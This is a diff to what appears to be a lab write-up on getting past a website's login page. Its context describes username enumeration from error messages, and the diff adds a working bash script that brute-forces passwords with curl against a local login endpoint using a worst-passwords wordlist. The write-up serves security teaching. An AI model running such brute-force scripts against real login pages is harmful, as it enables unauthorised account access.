@@ -114,6 +114,8 @@ Our goal is to get past the login page of the website below. We would need to fi
 
 ![Screenshot](files/website/website.png?raw=true)
 
+### Cracking active usernames 
+
 I tried a random username and I get a following alert:
 
 ![Screenshot](files/website/website-uname-not-found.png?raw=true)
@@ -137,13 +139,36 @@ cat facebook-firstnames.txt | head -n100000 |
 
 This script works by making a POST request to the server and if the response contains **"Error. Username does not exist."**, we can skip that username and look for other candidates
 
+### Cracking password for an active user
+
 I tried to login with an active user "adam" with a random password. This is what I got: 
 
 ![Screenshot](files/website/website-invalid-pass.png?raw=true)
 
 Again, we can modify our existing exploit to search for "Invalid password." string here.
 
+```
+wordlist="500-worst-passwords.txt"
 
+cat valid_usernames.txt |
+  while IFS= read -r uname
+  do
+    echo "\n Current user $uname"
+    cat $wordlist |
+    while IFS= read -r passwd
+    do
+    #echo "\n Trying for $uname $passwd"
+    output=`curl --data "username=$uname&password=$passwd" localhost:5000/login 2>/dev/null | grep "Invalid password."`
+    if [ $? -eq 0 ]; then
+        continue
+    else
+        echo "$uname + $passwd" >> "valid_passwords2.txt"
+        echo "$uname + $passwd"
+        break
+    fi
+    done
+  done
+```
 
 **NOTE**: Here, I am not using wordlists from **partA**. Instead, I am using 500-worst-passwords.txt I found on a random Github repo. This is because, users on social media sites are most likely to use bad passwords than linux users.
 
